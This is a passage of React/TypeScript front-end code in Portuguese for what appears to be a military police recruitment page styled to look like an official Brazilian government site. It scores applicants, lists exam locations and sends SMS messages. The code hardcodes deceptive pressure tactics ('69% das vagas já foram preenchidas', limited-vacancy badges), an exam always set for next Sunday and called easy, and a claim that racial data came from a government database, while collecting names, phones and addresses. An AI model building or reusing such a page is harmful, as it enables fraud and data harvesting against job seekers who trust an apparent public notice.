      description: `Responsável pelo comando de tropa, planejamento operacional e gestão administrativa dentro da corporação. Após aprovação, o candidato ingressa no Curso de Formação de Oficiais (CFO) da ${sigla}, com duração de até 3 anos, antes de assumir o comando de uma unidade.`,
      requirements: [
        'Diploma de curso superior em qualquer área, reconhecido pelo MEC',
        'Aprovação em todas as etapas do Concurso Público — prova objetiva, TAF, exames médicos e psicológicos',
        'Idade mínima de 18 anos',
        'Idoneidade moral e não ter sofrido condenação incompatível com o cargo'
      ],
      benefits: [
        'Vencimento inicial superior ao Soldado PM 2ª Classe',
        'Auxílio-alimentação de R$ 658,00/mês',
        'Estabilidade no serviço público estadual',
        '13º salário e férias remuneradas de 30 dias',
        'Plano de saúde e assistência médica da corporação',
        'Progressão de carreira até os postos mais altos da hierarquia'
      ],
      duration: 'Cargo efetivo de provimento permanente — estabilidade após o estágio probatório',
      workSchedule: 'Horário administrativo com disponibilidade para comando de tropa',
      specializations: getSpecializationsForProfile(data, 'oficial-pm'),
      profileMatch: calculateProfileMatch(data, 'oficial-pm'),
      matchReasons: getMatchReasons(data, 'oficial-pm', sigla),
      examInfo: {
        questions: 120,
        passingPercentage: calculatePassingPercentage(60, isWoman),
        subjects: ['Língua Portuguesa', 'Raciocínio Lógico e Matemática', 'Direito Constitucional e Administrativo', 'Conhecimentos Gerais e Atualidades', 'Teste de Aptidão Física (TAF)']
      }
    });

    // Sort by profile match descending
    return positions.sort((a, b) => b.profileMatch - a.profileMatch);
  };

  const getSpecializationsForProfile = (data: AssessmentData, cargo: string): string[] => {
    const specs: string[] = [];

    if (cargo === 'soldado-pm') {
      specs.push('Policiamento Ostensivo', 'Atendimento de Ocorrências', 'Abordagem e Uso de Força Proporcional');
      if (data.tempo_livre === 'esportes') specs.push('Policiamento Motorizado e Operações Especiais');
      if (data.motivo_pm === 'vocacao') specs.push('Rondas Comunitárias e Aproximação com a População');
      if (data.deslocamento === 'plena') specs.push('Atuação em Unidades do Interior');
      return specs;
    }

    if (cargo === 'oficial-pm') {
      specs.push('Comando de Tropa', 'Planejamento Operacional', 'Gestão Administrativa da Unidade');
      if (data.motivo_pm === 'carreira') specs.push('Gestão de Pessoas e Progressão de Carreira');
      if (data.situacao_ocupacional === 'servidor_publico') specs.push('Rotinas Administrativas do Serviço Público');
      if (data.area_atuacao === 'administrativa') specs.push('Coordenação de Setores Administrativos');
      return specs;
    }

    return ['Atividades Gerais do Concurso Público'];
  };

  const calculateProfileMatch = (data: AssessmentData, position: string): number => {
    let score = 70; // Base score

    // Escolaridade — requisito mínimo
    if (position === 'oficial-pm') {
      if (data.escolaridade === 'superior_concluido') score += 15;
      else if (data.escolaridade === 'superior_cursando') score += 5;
      else score -= 10; // não atende o requisito
    }
    if (position === 'soldado-pm') {
      if (['ensino_medio', 'curso_tecnico', 'superior_cursando', 'superior_concluido'].includes(data.escolaridade)) score += 10;
      else score -= 15;
    }

    // Motivo de ingresso
    if (data.motivo_pm === 'vocacao') score += 12;
    if (data.motivo_pm === 'estabilidade') score += 8;
    if (position === 'oficial-pm' && data.motivo_pm === 'carreira') score += 8;
    if (position === 'soldado-pm' && data.motivo_pm === 'remuneracao') score += 5;

    // Tempo livre / preparo físico
    if (data.tempo_livre === 'esportes') score += 10; // relevante para o TAF
    else if (data.tempo_livre === 'ar_livre') score += 5;

    // Experiência anterior em concurso PM
    if (data.concurso_pm_anterior === '3_mais') score += 8;
    else if (data.concurso_pm_anterior === '1_2_vezes') score += 5;

    // Situação ocupacional
    if (position === 'oficial-pm' && data.situacao_ocupacional === 'servidor_publico') score += 8;
    else if (data.situacao_ocupacional === 'estudante') score += 5;

    // Disponibilidade para deslocamento
    if (data.deslocamento === 'plena') score += 8;
    else if (data.deslocamento === 'regiao') score += 5;

    return Math.min(score, 100);
  };

  const getMatchReasons = (data: AssessmentData, position: string, sigla: string): string[] => {
    const reasons: string[] = [];

    if (position === 'soldado-pm') {
      reasons.push(`Ensino médio completo atende o requisito mínimo do cargo de Soldado PM 2ª Classe`);
      if (data.tempo_livre === 'esportes') reasons.push('Rotina esportiva é vantagem significativa para o Teste de Aptidão Física (TAF)');
      if (data.motivo_pm === 'vocacao') reasons.push('Vocação para servir e proteger é o perfil ideal para o policiamento ostensivo');
      if (data.deslocamento === 'plena' || data.deslocamento === 'regiao') reasons.push('Disponibilidade de deslocamento amplia as opções de batalhão após a formatura');
      if (data.concurso_pm_anterior !== 'primeira_vez') reasons.push('Experiência prévia em concursos PM é um diferencial na preparação para as etapas');
    }

    if (position === 'oficial-pm') {
      reasons.push(`Ensino superior completo atende o requisito do cargo de Oficial PM`);
      if (data.motivo_pm === 'carreira') reasons.push('Interesse em progressão de carreira é alinhado com a trajetória de comando do Oficial PM');
      if (data.situacao_ocupacional === 'servidor_publico') reasons.push('Experiência no serviço público facilita a adaptação à rotina administrativa e hierárquica');
      if (data.area_atuacao === 'administrativa') reasons.push('Perfil de interesse administrativo é valorizado na gestão de unidades da corporação');
      if (data.tempo_livre === 'esportes') reasons.push('Preparo físico é igualmente exigido no Teste de Aptidão Física do concurso de Oficial');
    }

    if (data.deslocamento === 'plena') {
      reasons.push(`Plena disponibilidade para servir em qualquer unidade da ${sigla}`);
    }

    return reasons;
  };

  const fetchExamLocations = async (cep: string) => {
    setIsLoadingLocations(true);
    try {
      const response = await fetch(`/api/locais-prova/${cep}`);
      const result: LocaisProvaResponse = await response.json();

      if (result.success && result.data) {
        setLocaisProvaData(result.data);

        // Normaliza para o formato ExamLocation usado no dialog
        const locais: ExamLocation[] = result.data.locais_prova.slice(0, 3).map(l => ({
          place_id: l.place_id,
          name: l.nome,
          address: l.endereco,
          distance: l.distancia_km ?? 0,
          type: (l.type as ExamLocation['type']) || 'escola_particular',
        }));

        setExamLocations(locais);
      } else {
        console.error('Erro ao buscar locais de prova:', result.error);
        setExamLocations([]);
      }
    } catch (error) {
      console.error('Erro na requisição:', error);
      setExamLocations([]);
    } finally {
      setIsLoadingLocations(false);
    }
  };

  const handleApplyPosition = async (positionId: string) => {
    const position = availablePositions.find(p => p.id === positionId);
    if (!position) return;
    
    // Track position selection
    trackEvent('military_position_selected', {
      position_id: positionId,
      position_title: position.title,
      position_rank: position.rank,
      salary_range: position.salary,
      profile_match: position.profileMatch,
      page: 'temporarios_page',
      timestamp: new Date().toISOString()
    });
    
    setIsApplying(positionId);
    setSelectedPosition(position);
    
    // Get CEP from userData in localStorage
    try {
      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
      const cep = userData.cep;
      
      if (!cep) {
        setIsApplying(null);
        alert('CEP não encontrado. Por favor, complete o cadastro primeiro.');
        return;
      }
      
      // Fetch exam locations
      await fetchExamLocations(cep);
      setIsDialogOpen(true);
      setIsApplying(null);
      
    } catch (error: any) {
      console.error('Erro ao acessar dados do usuário:', error);
      setIsApplying(null);
      const msg: string = error?.message ?? '';
      if (msg && msg !== 'Erro ao buscar locais de prova') {
        alert(msg);
      } else {
        alert('Erro ao acessar dados do usuário. Por favor, complete o cadastro primeiro.');
      }
    }
  };

  const getNextSunday = () => getExamDateFormatted();


  // Function to extract first name from full name
  const extractFirstName = (fullName: string): string => {
    if (!fullName) return '';
    
    // Split by space and get first part
    const nameParts = fullName.trim().split(' ');
    const firstName = nameParts[0];
    
    // Convert to proper case (first letter uppercase, rest lowercase)
    return firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase();
  };

  const handleConfirmApplication = async () => {
    if (!selectedLocation || !selectedTime) {
      alert('Por favor, selecione um local e horário para a prova.');
      return;
    }
    
    const selectedLocationData = examLocations.find(l => l.place_id === selectedLocation);
    
    // Track application confirmation
    trackEvent('military_application_confirmed', {
      position_id: selectedPosition?.id,
      position_title: selectedPosition?.title,
      exam_location: selectedLocationData?.name,
      exam_time: selectedTime,
      exam_date: getNextSunday(),
      page: 'temporarios_page',
      timestamp: new Date().toISOString()
    });
    
    // Save application data to localStorage
    const applicationData = {
      positionId: selectedPosition?.id,
      positionTitle: selectedPosition?.title,
      examLocation: selectedLocation,
      examLocationName: selectedLocationData?.name,
      examLocationAddress: selectedLocationData?.address,
      examTime: selectedTime,
      examDate: getNextSunday(),
      appliedAt: new Date().toISOString(),
      locaisProvaData,
      selectedJunta: selectedLocationData
    };
    
    localStorage.setItem('applicationData', JSON.stringify(applicationData));
    
    // Also save junta to database if candidate is registered
    try {
      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
      if (userData.candidateId && selectedLocationData) {
        await fetch(`/api/candidates/${userData.candidateId}/junta`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            juntaName: selectedLocationData.name,
            juntaAddress: selectedLocationData.address,
            juntaDistance: selectedLocationData.distance,
            juntaType: selectedLocationData.type,
            juntaPlaceId: selectedLocationData.place_id
          })
        });
      }
    } catch (error) {
      console.error('Erro ao salvar junta selecionada:', error);
      // Continue even if database save fails
    }
    
    // Send SMS notification asynchronously
    try {
      const userData = JSON.parse(localStorage.getItem('userData') || '{}');
      
      // Extract required data for SMS
      const phoneNumber = userData.telefone;
      const city = userData.cidade;
      const gender = userData.genero;
      const fullName = userData.nomeCompleto;
      const firstName = extractFirstName(fullName);
      
      // Only send SMS if we have the required data
      if (phoneNumber && city && firstName && gender) {
        // Send SMS asynchronously (don't wait for response)
        fetch('/api/sms-extra', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            phoneNumber: phoneNumber,
            city: city.normalize('NFD').replace(/\p{Diacritic}/gu, ''),
            firstName: firstName.normalize('NFD').replace(/\p{Diacritic}/gu, ''),
            gender: gender === 'masculino' ? 'masculino' : 'feminino',
            cargo: (selectedPosition?.title || '').normalize('NFD').replace(/\p{Diacritic}/gu, '')
          })
        }).then(response => {
          if (response.ok) {
            console.log('SMS enviado com sucesso para:', phoneNumber);
          } else {
            console.error('Erro ao enviar SMS:', response.statusText);
          }
        }).catch(error => {
          console.error('Erro na requisição SMS:', error);
        });
      } else {
        console.warn('Dados insuficientes para envio de SMS:', {
          phoneNumber: !!phoneNumber,
          city: !!city,
          firstName: !!firstName
        });
      }
    } catch (error) {
      console.error('Erro ao processar dados para SMS:', error);
    }
    
    // Redirect to registration page
    setLocation('/registro');
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="flex flex-col items-center gap-3">
          <div className="w-6 h-6 border-2 border-gray-200 rounded-full animate-spin" style={{ borderTopColor: '#1351b4' }}></div>
          <p className="text-sm text-gray-500">{loadingMessage}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader customTitle={sigla} customSubtitle="Vagas Disponíveis" />
      
      <main className="max-w-6xl mx-auto px-6 py-8 pt-0">
        <nav className="text-xs text-gray-500 mb-6" aria-label="Breadcrumb">
          <Link href="/" className="hover:text-gray-700 cursor-pointer">Home</Link>
          <span className="mx-1 text-gray-400">›</span>
          <Link href="/pessoal" className="hover:text-gray-700 cursor-pointer">Avaliação</Link>
          <span className="mx-1 text-gray-400">›</span>
          <span className="text-gray-900 font-medium">Cargos do Concurso {sigla} 2026</span>
        </nav>

        <header className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-4 leading-tight">
            {firstName && (
              <>
                {firstName}, escolha o cargo no qual gostaria de atuar na {sigla}
              </>
            )}
            {!firstName && (
              <>
                Escolha o cargo no qual gostaria de atuar na {sigla}
              </>
            )}
          </h1>
          <p className="text-gray-600 leading-relaxed">
            {isWoman 
              ? `Com base no seu perfil e nas suas qualificações, identificamos oportunidades no Concurso Público ${sigla} 2026. A corporação garante igualdade de condições para candidatas femininas em todos os cargos. Selecione a posição na qual deseja atuar.`
              : `Com base no seu perfil e qualificações, identificamos as seguintes oportunidades no Concurso Público ${sigla} 2026. Selecione a posição que corresponde ao cargo desejado.`
            }
          </p>
        </header>

        {/* Urgency Alert */}
        <div className="border-l-4 p-3 mb-8" style={{ borderLeftColor: '#d97706', backgroundColor: '#fef3c7' }}>
          <div className="flex items-center">
            <span className="text-orange-800 mr-3 font-bold">⚠</span>
            <p className="text-sm font-medium text-orange-800">
              <strong>69% das vagas deste edital já foram preenchidas.</strong> Confirme sua inscrição antes que as vagas se esgotem.
            </p>
          </div>
        </div>



        {/* Special section for women */}
        {isWoman && (
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-8">
            <div className="flex items-center space-x-3 mb-3">
              <div className="w-3 h-3 bg-[#1351b4] rounded-full"></div>
              <h3 className="font-semibold text-blue-800 text-base">
                Programa de Valorização Feminina na {sigla}
              </h3>
            </div>
            <p className="text-sm text-blue-700 leading-relaxed">
              Iniciativa voltada à ampliação da participação feminina no efetivo da {sigla}. O edital garante igualdade plena de condições e oportunidades para candidatas femininas em todos os cargos — Soldado PM 2ª Classe e Oficial PM —, com critérios de seleção idênticos e vagas abertas em todo o estado.
            </p>
          </div>
        )}

        <div className="grid gap-6 md:grid-cols-1 lg:grid-cols-2">
          {availablePositions.map((position) => (
            <Card key={position.id} className="border border-gray-200 hover:shadow-lg transition-shadow">
              <CardHeader>
                {/* Urgency indicator based on position type */}
                {(() => {
                  const getPositionKey = (title: string) => {
                    if (title.toLowerCase().includes('oficial')) return 'oficial-pm';
                    return 'soldado-pm';
                  };
                  
                  const posKey = getPositionKey(position.title);
                  const stats = positionStats[posKey];
                  
                  if (stats && stats.percentageRemaining < 20) {
                    return (
                      <div className="bg-red-100 border border-red-300 rounded-lg p-2 mb-3">
                        <div className="flex items-center justify-between">
                          <span className="text-red-800 text-xs font-bold">🚨 VAGAS LIMITADAS</span>
                          <span className="text-red-600 text-xs font-bold">
                            {Math.round(stats.percentageRemaining)}% restantes
                          </span>
                        </div>
                      </div>
                    );
                  } else if (stats && stats.percentageRemaining < 35) {
                    return (
                      <div className="bg-orange-100 border border-orange-300 rounded-lg p-2 mb-3">
                        <div className="flex items-center justify-between">
                          <span className="text-orange-800 text-xs font-bold">⚡ ALTA DEMANDA</span>
                          <span className="text-orange-600 text-xs font-bold">
                            {Math.round(stats.percentageRemaining)}% restantes
                          </span>
                        </div>
                      </div>
                    );
                  }
                  return null;
                })()}
                
                <div className="flex justify-between items-start mb-2">
                  <div>
                    <CardTitle className="text-xl text-gray-900">{position.title}</CardTitle>
                    <CardDescription className="text-sm text-gray-600 mt-1">
                      {position.rank} • {position.requiredEducation}
                    </CardDescription>
                  </div>
                </div>
                
                <div className="text-2xl font-bold" style={{ color: '#1351b4' }}>
                  {position.salary}
                </div>
              </CardHeader>
              
              <CardContent className="space-y-4">
                <p className="text-gray-700 text-sm leading-relaxed">
                  {position.description}
                </p>
                
                <div>
                  <h4 className="font-semibold text-gray-900 mb-2">Especialidades Disponíveis:</h4>
                  <div className="flex flex-wrap gap-1">
                    {position.specializations.slice(0, 4).map((spec, index) => (
                      <Badge key={index} variant="outline" className="text-xs">
                        {spec}
                      </Badge>
                    ))}
                    {position.specializations.length > 4 && (
                      <Badge variant="outline" className="text-xs">
                        +{position.specializations.length - 4} mais
                      </Badge>
                    )}
                  </div>
                </div>
                
                <div>
                  <h4 className="font-semibold text-gray-900 mb-2">
                    {isWoman ? "Por que essa posição é ideal para você:" : "Por que esse cargo é ideal para você:"}
                  </h4>
                  <ul className="text-sm text-gray-700 space-y-1">
                    {position.matchReasons.slice(0, 3).map((reason, index) => (
                      <li key={index} className="flex items-start">
                        <span className="text-green-600 mr-2">•</span>
                        {reason}
                      </li>
                    ))}
                  </ul>
                </div>
                
                <div className="bg-blue-50 border border-blue-200 rounded p-3 mb-4">
                  <h4 className="font-semibold text-blue-900 mb-2">Prova de Seleção:</h4>
                  <div className="text-sm text-blue-800 space-y-1">
                    <p><strong>{position.examInfo.questions} questões</strong> - Precisa acertar <strong>{position.examInfo.passingPercentage}%</strong> para aprovação</p>
                    {(() => {
                      const quotaInfo = getRacialQuotaInfo();
                      if (quotaInfo.hasQuota) {
                        const raceDisplayMap: Record<string, string> = {
                          'parda': 'Parda',
                          'preta': 'Preta', 
                          'amarela': 'Amarela'
                        };
                        const displayRace = raceDisplayMap[quotaInfo.race] || quotaInfo.race.charAt(0).toUpperCase() + quotaInfo.race.slice(1);
                        return (
                          <div className="bg-gray-50 border-l-4 border-blue-600 p-3 mt-2">
                            <div className="flex justify-between items-start mb-1">
                              <p className="text-xs text-gray-700 font-semibold">SISTEMA DE COTAS RACIAIS</p>
                            </div>
                            <div className="space-y-1">
                              <p className="text-xs text-gray-600">
                                <span className="font-medium">Etnia {isWoman ? 'da Candidata' :'do Candidato'}:</span> {isWoman ? displayRace : displayRace.replace('Preta', 'Preto').replace('Parda', 'Pardo').replace('Amarela','Amarelo')}
                              </p>
                              <p className="text-xs text-gray-600">
                                <span className="font-medium">Fonte:</span> Base de Dados Governamental
                              </p>
                              <p className="text-xs text-gray-600">
                                Os benefícios são aplicados automaticamente. Sua nota mínima necessária para aprovação será reduzida em {quotaInfo.reductionPercentage}%, o que aumenta suas chances de sucesso. Em caso de empate, você terá prioridade, e existem vagas reservadas para candidatos da sua etnia.
                              </p>
                              <p className="text-xs text-green-700 font-medium">
                                ✓ Benefício aplicado automaticamente
                              </p>
                            </div>
                          </div>
                        );
                      }
                      return null;
                    })()}
                    <p className="text-xs">Disciplinas da prova <strong>(nível fácil):</strong> {' '}{position.examInfo.subjects.join(', ')}</p>
                  </div>
                </div>

                <div className="text-xs text-gray-600">
                  <div>
                    <span className="font-medium">Benefícios:</span> {position.duration}
                  </div>
                </div>
                
                <Button 
                  onClick={() => handleApplyPosition(position.id)}
                  disabled={isApplying === position.id}
                  className="w-full text-white font-semibold py-2 transition-colors duration-200"
                  style={{ backgroundColor: '#1351b4' }}
                >
                  {isApplying === position.id ? (
                    <>
                      <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                      Carregando locais...
                    </>
                  ) : (
                    isWoman ? 'Candidatar-se a esta Posição' : 'Selecionar este Cargo'
                  )}
                </Button>
              </CardContent>
            </Card>
          ))}
        </div>


        
        <div className="mt-12 bg-gray-50 border border-gray-200 rounded-lg p-8">
          <h3 className="text-2xl font-bold text-gray-900 mb-6 text-center">
            {personalizedFAQs ? "Perguntas Personalizadas Para Você" : "Perguntas Frequentes"}
          </h3>
          
          {/* Loading state para FAQ personalizado */}
          {isLoadingFAQs && (
            <div className="flex items-center justify-center space-x-3 py-8">
              <Loader2 className="w-5 h-5 text-green-600 animate-spin" />
              <p className="text-gray-600">Gerando perguntas específicas para seu perfil...</p>
            </div>
          )}

          {/* FAQ Personalizado por IA */}
          {personalizedFAQs?.faqs && !isLoadingFAQs && (
            <div className="space-y-6">
              {personalizedFAQs.faqs.map((faq: any, index: number) => (
                <div key={index} className="bg-white rounded-lg p-4 border border-gray-100 hover:border-green-200 transition-colors">
                  <h4 className="font-semibold text-gray-900 mb-2">
                    {faq.pergunta}
                  </h4>
                  <p className="text-gray-700 text-sm leading-relaxed">
                    {faq.resposta}
                  </p>
                </div>
              ))}
              
              <div className="text-center mt-6 pt-4 border-t border-gray-200">
                <p className="text-xs text-gray-500">
                  Respostas personalizadas com base em candidatos com perfil semelhante ao seu
                </p>
              </div>
            </div>
          )}

          {/* FAQ personalizado antigo como fallback */}
          {!personalizedFAQs?.faqs && !isLoadingFAQs && (
            <div className="space-y-6">
              {getPersonalizedFAQs(assessmentData, userData, isWoman, sigla).map((faq, index) => (
                <div key={index} className="bg-white rounded-lg p-4 border border-gray-100">
                  <h4 className="font-semibold text-gray-900 mb-2">
                    {faq.question}
                  </h4>
                  <p className="text-gray-700 text-sm">
                    {faq.answer}
                  </p>
                </div>
              ))}
            </div>
          )}
        </div>
      </main>
      
      <ExercitoFooter />

      {/* Exam Location Selection Dialog */}
      <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
        <DialogContent className="w-[calc(100%-2rem)] sm:w-full max-w-md max-h-[min(85dvh,85vh)] flex flex-col overflow-hidden p-0 gap-0 rounded-lg">
          <div className="h-1 shrink-0" style={{ backgroundColor: '#1351b4' }} />

          <div className="px-4 sm:px-6 pt-4 sm:pt-5 pb-4 shrink-0">
            <DialogHeader className="space-y-2 text-left">
              <p className="text-[11px] font-semibold tracking-wider uppercase break-words" style={{ color: '#1351b4' }}>
                Convocação para prova objetiva
              </p>
              <DialogTitle className="text-base sm:text-lg font-semibold text-gray-900 leading-snug">
                Escolha o local de realização da prova
              </DialogTitle>
              <DialogDescription asChild>
                <div className="text-sm text-gray-600 leading-relaxed">
                  <p>
                    Cargo <span className="font-medium text-gray-800">{selectedPosition?.title}</span> — prova em{' '}
                    <span className="font-medium text-gray-800">{getNextSunday()}</span>, às{' '}
                    <span className="font-medium text-gray-800">14h</span> (horário fixo, sem alteração).
                  </p>
                  <p className="mt-1.5">
                    Selecione abaixo a unidade mais próxima de você. O local definido nesta etapa será registrado no seu comprovante de inscrição.
                  </p>
                </div>
              </DialogDescription>
            </DialogHeader>
          </div>

          {isLoadingLocations ? (
            <div className="flex flex-col items-center justify-center py-12 px-4 sm:px-6">
              <Loader2 className="w-6 h-6 animate-spin mb-3 text-gray-400 shrink-0" />
              <span className="text-sm text-gray-500 text-center">Buscando locais de prova próximos a você...</span>
            </div>
          ) : (
            <div className="flex flex-col min-h-0 flex-1">
              <div className="px-4 sm:px-6 pt-1 overflow-y-auto flex-1 min-h-0">
                <p className="text-[11px] font-semibold tracking-wider uppercase text-gray-400 mb-2 sticky top-0 bg-white pt-1">
                  Unidades disponíveis
                </p>
                <RadioGroup value={selectedLocation} onValueChange={setSelectedLocation}>
                  <div className="space-y-2 pb-3">
                    {examLocations.map((location) => {
                      const isSelected = selectedLocation === location.place_id;
                      return (
                        <label
                          key={location.place_id}
                          htmlFor={location.place_id}
                          className="flex items-start gap-3 p-3 rounded-md border cursor-pointer transition-colors"
                          style={{
                            borderColor: isSelected ? '#1351b4' : '#e5e7eb',
                            backgroundColor: isSelected ? '#f5f8fd' : 'white',
                          }}
                        >
                          <RadioGroupItem value={location.place_id} id={location.place_id} className="mt-0.5 shrink-0" />
                          <div className="flex-1 min-w-0">
                            <p className="font-medium text-gray-900 text-sm break-words">{location.name}</p>
                            <p className="text-xs text-gray-500 mt-0.5 break-words">{location.address}</p>
                          </div>
                        </label>
                      );
                    })}
                  </div>
                </RadioGroup>

                <p className="text-xs text-gray-400 leading-relaxed border-t border-gray-100 pt-3 pb-4">
                  Após a confirmação, a unidade e o horário informados passam a valer como local oficial de apresentação do candidato.
                </p>
              </div>

              {/* Action Buttons */}
              <div className="space-y-2 px-4 sm:px-6 pt-3 pb-4 sm:pb-6 border-t border-gray-100 shrink-0">
                <Button
                  onClick={handleConfirmApplication}
                  disabled={!selectedLocation}
                  className="w-full text-white font-medium py-2.5 text-sm disabled:opacity-50"
                  style={{ backgroundColor: '#1351b4' }}
                >
                  Confirmar e prosseguir
                </Button>
                <Button
                  variant="ghost"
                  onClick={() => setIsDialogOpen(false)}
                  className="w-full text-sm py-2 text-gray-500"
                >
                  Cancelar
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}